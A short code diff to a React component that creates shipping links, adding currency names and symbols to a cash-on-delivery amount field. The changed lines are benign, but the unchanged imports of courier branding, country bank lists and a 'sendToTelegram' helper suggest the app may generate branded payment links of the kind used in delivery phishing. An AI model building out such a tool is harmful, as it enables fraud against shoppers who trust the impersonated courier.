@@ -10,6 +10,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
+import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -254,16 +255,26 @@ const CreateShippingLink = () => {
                 <Label className="mb-2 flex items-center gap-2 text-sm">
                   <DollarSign className="w-3 h-3" />
                   مبلغ الدفع عند الاستلام
+                  {country && (
+                    <span className="text-xs text-muted-foreground">
+                      ({getCurrencyName(country)})
+                    </span>
+                  )}
                 </Label>
                 <Input
                   type="number"
                   value={codAmount}
                   onChange={(e) => setCodAmount(e.target.value)}
-                  placeholder="0.00"
+                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                   className="h-9 text-sm"
                   step="0.01"
                   min="0"
                 />
+                {country && (
+                  <p className="text-xs text-muted-foreground mt-1">
+                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
+                  </p>
+                )}
               </div>
               
               {/* Payment Method Selection */}
